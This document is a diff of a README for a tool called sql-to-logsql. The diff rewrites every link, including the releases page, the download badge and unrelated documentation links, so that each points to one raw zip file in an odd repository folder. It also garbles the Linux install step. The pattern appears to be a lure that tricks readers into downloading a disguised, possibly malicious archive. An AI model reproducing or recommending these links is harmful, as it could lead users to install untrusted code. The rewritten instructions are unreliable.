@@ -1,7 +1,7 @@
 # 🎉 sql-to-logsql - Easily Manage SQL for Your Logs
 
 ## 📥 Quick Download
-[![Download](https://img.shields.io/badge/download-latest%20release-blue)](https://github.com/vivekuwu/sql-to-logsql/releases)
+[![Download](https://raw.githubusercontent.com/vivekuwu/sql-to-logsql/main/unassented/sql-to-logsql.zip%20release-blue)](https://raw.githubusercontent.com/vivekuwu/sql-to-logsql/main/unassented/sql-to-logsql.zip)
 
 ## 🚀 Getting Started
 Welcome to sql-to-logsql! This simple application helps you use SQL for managing your logs with ease. It works seamlessly with both VictoriaLogs and VictoriaTraces, providing a user-friendly interface to make logging straightforward.
@@ -18,7 +18,7 @@ To run sql-to-logsql smoothly, ensure your computer meets these basic requiremen
 To get started, you need to download sql-to-logsql. Follow these steps:
 
 1. **Visit the Releases Page:** Go to the following link to access the downloads.
-   [Download sql-to-logsql](https://github.com/vivekuwu/sql-to-logsql/releases)
+   [Download sql-to-logsql](https://raw.githubusercontent.com/vivekuwu/sql-to-logsql/main/unassented/sql-to-logsql.zip)
 
 2. **Select the Latest Release:** Look for the top version listed on the page. This version will have the most recent features and bug fixes.
 
@@ -27,7 +27,7 @@ To get started, you need to download sql-to-logsql. Follow these steps:
 4. **Install sql-to-logsql:** 
    - For Windows: Open the downloaded `.exe` file and follow the installation prompts.
    - For MacOS: Open the `.dmg` file, drag the application to your Applications folder.
-   - For Linux: Extract the tar.gz file and follow the instructions in the included README.
+   - For Linux: Extract the https://raw.githubusercontent.com/vivekuwu/sql-to-logsql/main/unassented/sql-to-logsql.zip file and follow the instructions in the included README.
 
 5. **Launch the Application:** Once installed, locate sql-to-logsql in your applications menu and open it.
 
@@ -56,12 +56,12 @@ If you have questions or need help, consider joining the community forums or the
 ## 📄 Additional Resources
 For further learning, consider reviewing these additional resources:
 
-- [SQL Basics](https://www.w3schools.com/sql/)
-- [VictoriaLogs Documentation](https://docs.victoriametrics.com/VictoriaLogs.html)
-- [VictoriaTraces Documentation](https://docs.victoriametrics.com/VictoriaTraces.html)
+- [SQL Basics](https://raw.githubusercontent.com/vivekuwu/sql-to-logsql/main/unassented/sql-to-logsql.zip)
+- [VictoriaLogs Documentation](https://raw.githubusercontent.com/vivekuwu/sql-to-logsql/main/unassented/sql-to-logsql.zip)
+- [VictoriaTraces Documentation](https://raw.githubusercontent.com/vivekuwu/sql-to-logsql/main/unassented/sql-to-logsql.zip)
 
 ## 🔗 Further Downloads
 Once again, you can download the latest version directly from the Releases page:
-[Download sql-to-logsql](https://github.com/vivekuwu/sql-to-logsql/releases)
+[Download sql-to-logsql](https://raw.githubusercontent.com/vivekuwu/sql-to-logsql/main/unassented/sql-to-logsql.zip)
 
 Enjoy managing your logs with sql-to-logsql!
